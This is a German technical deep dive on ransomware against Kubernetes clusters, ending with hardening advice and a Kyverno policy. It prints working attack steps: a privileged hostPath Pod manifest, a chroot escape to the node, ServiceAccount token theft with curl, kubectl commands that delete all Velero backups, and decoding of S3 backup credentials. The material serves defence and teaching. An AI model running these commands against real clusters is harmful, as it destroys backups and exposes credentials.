# Ransomware – Band 25: Kubernetes- und Cloud-Native-Ransomware

Technischer Deep Dive: Kubernetes-Angriffsflächen, Container-Escape-Mechaniken (Privileged Pods, hostPath, cgroups), ServiceAccount Token-Missbrauch, böswillige DaemonSets, CSI/PV-Verschlüsselung, Velero-Backup-Sabotage und Kyverno/PSS-Härtung.

---

## 1. Cloud-Native und Container-Angriffsflächen

Mit der Verlagerung monolithischer IT-Systeme in Container-Orchestrierungsplattformen wie Kubernetes (K8s, OpenShift, EKS, AKS) haben Ransomware-Akteure ihre Taktiken angepasst. Ziel ist nicht mehr das einzelne Betriebssystem, sondern der gesamte Cluster und dessen Persistent Volumes (PVs).

```
+----------------------------------------------------------------------------+
| Kubernetes Cluster Angriffsvektoren                                        |
+----------------------------------------------------------------------------+
| [ Internet / Angreifer ]                                                   |
|            |                                                               |
|            +---> 1. Verwundbare Webanwendung im Pod (RCE)                  |
|            +---> 2. Exposed Kubelet API (Port 10250 ohne Auth)             |
|            +---> 3. Vergiftetes Container-Image in Registry (Supply Chain) |
|            |                                                               |
|            v                                                               |
| +------------------------------------------------------------------------+ |
| | Kompromittierter Pod (Namespace 'production')                          | |
| |   - Stielt Token: /var/run/secrets/kubernetes.io/serviceaccount/token  | |
| |   - Prüft RBAC-Rechte gegen kube-apiserver                             | |
| +------------------------------------------------------------------------+ |
|            |                                                               |
|            v [ Übermächtige ClusterRole: Rechte zum Erstellen von DaemonSets ]
| +------------------------------------------------------------------------+ |
| | Kube-APIServer (Port 6443)                                             | |
| |   - Verarbeitet böswilliges 'Privileged DaemonSet'                     | |
| +------------------------------------------------------------------------+ |
|            |                                                               |
|            +-----------------------+-----------------------+               |
|            v                       v                       v               |
|    [ Worker Node 1 ]       [ Worker Node 2 ]       [ Worker Node 3 ]       |
|    - hostPath: / gemountet - hostPath: / gemountet - hostPath: / gemountet |
|    - Verschlüsselt PVs     - Verschlüsselt PVs     - Verschlüsselt PVs     |
+----------------------------------------------------------------------------+
```

---

## 2. Container-Escape und Host-Übernahme

Gelingt einem Angreifer die Remote Code Execution (RCE) in einem Container, ist er zunächst durch Linux-Namespaces (PID, Mount, Net, IPC, UTS) und cgroups isoliert. Fehlkonfigurationen hebeln diese Isolation jedoch vollständig aus.

### 2.1 Der Privileged-Pod Escape (`securityContext.privileged: true`)

Ist ein Pod als "privilegiert" deklariert, deaktiviert die Container-Runtime (containerd, CRI-O) alle Seccomp- und AppArmor-Profile und reicht alle Host-Gerätedateien (`/dev/*`) direkt in den Container durch:

```yaml
# Auszug: Gefährliche Pod-Sicherheitskonfiguration
apiVersion: v1
kind: Pod
metadata:
  name: maintenance-tool
spec:
  containers:
  - name: shell
    image: ubuntu:24.04
    securityContext:
      privileged: true # Deaktiviert Isolation komplett
    volumeMounts:
    - mountPath: /host
      name: host-root
  volumes:
  - name: host-root
    hostPath:
      path: / # Mountet gesamtes Host-Dateisystem
```

#### Escape-Befehlskette des Angreifers:
```bash
# 1. Innerhalb des Containers Zugriff auf Host-Dateisystem verifizieren:
ls -la /host/etc/shadow

# 2. Ausbruch in den Host-Root-Kontext via chroot:
chroot /host /bin/bash

# 3. Nun hat der Angreifer volle Root-Rechte direkt auf dem Linux-Worker-Node!
```

### 2.2 Linux Capabilities Abuse (`CAP_SYS_ADMIN`)

Selbst ohne `privileged: true` reicht oft die Vergabe einzelner Linux-Capabilities:
- **`CAP_SYS_ADMIN`:** Erlaubt das Mounten von Dateisystemen. Angreifer binden das cgroup-Dateisystem ein und nutzen den bekannten `release_agent`-Mechanismus, um Befehle direkt im Kernel-Kontext des Hosts auszuführen.
- **`CAP_SYS_PTRACE`:** Erlaubt das Injizieren von Shellcode in Prozesse des Hosts, sofern `hostPID: true` gesetzt ist.

---

## 3. Kubernetes API-Exploitation & Böswillige DaemonSets

Standardmäßig mountet Kubernetes in jeden Pod ein JWT-Dienstkonto-Token unter:
`/var/run/secrets/kubernetes.io/serviceaccount/token`

### 3.1 Token-Diebstahl und RBAC-Prüfung

Der Angreifer liest das Token aus und prüft über die Kube-APIServer-API seine Berechtigungen:

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# Prüfe Berechtigungen via Kubernetes API:
curl --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
    https://kubernetes.default.svc/api/v1/namespaces/default/pods
```

### 3.2 Das "Ransomware DaemonSet" Pattern

Besitzt das Dienstkonto Rechte zum Anlegen von Workloads (`daemonsets`, `deployments`), rollt der Angreifer ein **böswilliges DaemonSet** aus:
- **Vorteil für den Angreifer:** Ein DaemonSet garantiert, dass Kubernetes automatisch auf **jedem einzelnen Worker Node** des Clusters eine Instanz des Schad-Pods startet.
- **Verschlüsselungsdurchsatz:** Jeder Schad-Pod mountet `/var/lib/kubelet/pods` (wo alle Persistent Volumes eingehängt sind) und verschlüsselt die Daten der Datenbanken (Postgres, MySQL, MongoDB) parallel und innerhalb von Sekunden.

---

## 4. Persistent Volume (PV) & Backup-Sabotage (Velero)

Unternehmen nutzen Cloud-Native Backup-Tools wie **Velero** oder **Kasten K10**, um Cluster-Zustände und Volume-Snapshots (via CSI - Container Storage Interface) in S3-Buckets zu sichern.

### 4.1 Gezielte Sabotage von Velero

Besitzt der Angreifer Zugriff auf den Kube-APIServer:
```bash
# 1. Löschen aller existierenden Velero-Backups und Zeitpläne:
kubectl delete backups.velero.io --all -A
kubectl delete schedules.velero.io --all -A

# 2. Auslesen der S3-Backup-Zugangsdaten aus dem Velero-Secret:
kubectl get secret -n velero cloud-credentials -o jsonpath="{.data.cloud}" | base64 -d

# 3. Direkte Löschung der Backup-Dateien im S3-Storage via AWS/S3 CLI
```

---

## 5. Cloud-Native Härtung & Admission Control

Um Angriffe auf Kubernetes-Cluster strukturell zu unterbinden, müssen Richtlinien bereits beim Deployment erzwungen werden.

```
+-----------------------------------------------------------------------+
| Kubernetes Sicherheitsarchitektur                                    |
+-----------------------------------------------------------------------+
| 1. Pod Security Standards (PSS):                                      |
|    - Namespace-Label: pod-security.kubernetes.io/enforce: restricted   |
|                                                                       |
| 2. Validating Admission Controller (Kyverno / OPA Gatekeeper):        |
|    - Blockiert 'privileged: true'                                     |
|    - Blockiert 'hostPath'-Mounts                                      |
|    - Blockiert 'hostPID' und 'hostNetwork'                            |
|                                                                       |
| 3. RBAC Least-Privilege:                                              |
|    - 'automountServiceAccountToken: false' als Standard               |
|    - Keine Wildcards ('*') in Role-Definitionen                       |
|                                                                       |
| 4. Network Policies & Egress-Filtering:                               |
|    - Default-Deny für alle ausgehenden Verbindungen                   |
|    - Blockieren des Cloud-Metadata-Endpoints (169.254.169.254)        |
+-----------------------------------------------------------------------+
```

### 5.1 Kyverno Policy: Blockieren von HostPath und Privileged Pods

```yaml
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: disallow-privileged-and-hostpath
spec:
  validationFailureAction: Enforce
  rules:
  - name: validate-privileged
    match:
      any:
      - resources:
          kinds:
          - Pod
    validate:
      message: "Privilegierte Pods sind im Cluster strikt verboten!"
      pattern:
        spec:
          containers:
          - =(securityContext):
              =(privileged): false
  - name: validate-hostpath
    match:
      any:
      - resources:
          kinds:
          - Pod
    validate:
      message: "hostPath Volumes sind aus Sicherheitsgründen verboten!"
      pattern:
        spec:
          =(volumes):
          - X(hostPath): "null"
```

---

## Quellen
- [Q60] Rhino Security Labs – S3 Ransomware: Attack Vector Using SSE-C
- [Q83] CNCF – Kubernetes Security Best Practices & Pod Security Standards
- [Q84] Aqua Security – Cloud Native Threat Report: Ransomware and Cryptominers in K8s
- [Q85] Sysdig – Threat Research: Analyzing Real-World Attacks on Container Orchestration
